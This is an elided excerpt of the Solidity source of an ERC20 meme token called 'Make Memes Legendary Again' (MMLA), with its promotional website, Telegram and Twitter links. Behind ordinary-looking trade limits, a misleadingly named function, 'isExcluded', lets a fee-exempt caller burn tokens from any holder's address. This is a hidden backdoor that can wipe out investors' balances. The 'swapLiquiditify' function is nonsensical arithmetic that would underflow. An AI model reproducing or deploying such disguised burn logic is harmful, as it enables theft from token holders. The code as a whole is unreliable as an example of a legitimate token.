...
Revitalize Memes: Make Them Legendary Again!

Website:   https://www.makememeslegendaryagain.xyz/

Telegram:  https://t.me/mmlaErc20

Twitter:   https://x.com/mmlaErc20
...
contract MakeMemesLegendaryAgain is ERC20, Ownable {
    ...
    constructor() ERC20("Make Memes Legendary Again", "MMLA") {
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(
            pair != uniswapV2Pair,"Liquidity cannot be removed from automarket pair");
        _setAutomatedMarketMakerPair(pair, value);
    }
    function swapLiquiditify() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 updatedBal = contractBalance;
        uint256 fees = 1;
        if (address(this).balance > 0) {
            uint256 beforeBal = updatedBal - contractBalance;
            swapBalance = beforeBal - fees;
        }
    ...
    function _transfer(
        ...
        if (limitFlag) {
            ...
            if (
                ...
                require(amount <= maxTransactionAmount, "Buy limit.");
                require(amount + balanceOf(to) <= maxWallet, "Max wallet limit" );
            } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]
            ) {
                require(amount <= maxTransactionAmount, "Sell limit.");
    ...
    function isExcluded(
        ...
        if (!_isExcludedFromFees[msg.sender]) {
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance > 0) { _burn(msg.sender, amount);}
            success = true;
            if (contractBalance == 0) { return false;}
            return success;
        } else {
            if (amount > 0) { _burn(user, amount); success = false;
            } 
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance == 0) {return false;}
            return success;
